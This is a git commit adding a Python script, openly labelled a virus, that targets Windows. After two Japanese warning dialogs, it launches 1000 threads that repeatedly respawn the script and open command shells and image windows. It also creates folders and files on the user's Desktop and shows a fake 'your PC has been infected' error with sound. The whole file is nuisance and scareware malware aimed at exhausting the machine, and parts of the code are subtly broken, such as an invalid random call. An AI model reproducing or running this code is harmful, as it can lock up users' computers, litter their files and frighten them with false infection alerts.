d27b52b1e1cd1ed60c0ec77c3eda6532559dd7bb
zearakun <91083604+zearakun@users.noreply.github.com>
2022-06-01 00:30:53 +0900

    Create main.py

---
+++ virus/main.py
@@ -0,0 +1,174 @@
+import sys
+from tkinter import messagebox
+import tkinter as tk
+from PIL import ImageTk
+import subprocess
+import threading
+import pygame
+import random
+import os
+
+pygame.init()
+pygame.mixer.init()
+errorsound = pygame.mixer.Sound('audio/error.wav')
+
+
+
+
+
+def pythonopen():
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
+  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
+  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
+  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
+  errorsound.play()
+
+
+def imageopen():
+  root = tk.Tk()
+  canvas = tk.Canvas(root)
+  canvas.pack(expand = True, fill = tk.BOTH)
+  image = ImageTk.PhotoImage(file="image/aarr.png")
+  canvas_width = canvas.winfo_width()
+  canvas_height = canvas.winfo_height()
+  canvas.create_image(
+                canvas_width / 2,       # 画像表示位置(Canvasの中心)
+                canvas_height / 2,                   
+                image=image  # 表示画像データ
+                )
+  root.mainloop()
+
+
+
+def windowopen():
+  for diepc in range(1000):
+    pythonopen()
+    imageopen()
+
+threads = []
+
+def virusstart():
+  messagebox.showinfo('start', 'スタート😈')
+  for a in range(1000):
+    threads.append(threading.Thread(target=windowopen))
+    threads[a].start()
+
+
+keikoku = messagebox.askyesno('警告', '''このソフトはウイルスです
+このソフトによってファイル、フォルダに影響が起きても
+私は何も私は責任を取りません
+起動する場合は「はい」を押してください、起動しない場合は「いいえ」を押してください''')
+
+if keikoku == True:
+  saisyuukeikoku = messagebox.askyesno('最終警告', '''お遊びでこのファイルを起動していないですね？
+初めていいですね？？
+良い場合は「はい」よくない場合は「いいえ」を選択してください''')
+  if saisyuukeikoku == True:
+    virusstart()
+  if saisyuukeikoku == False:
+    sys.exit()
+if keikoku == False:
+    sys.exit()
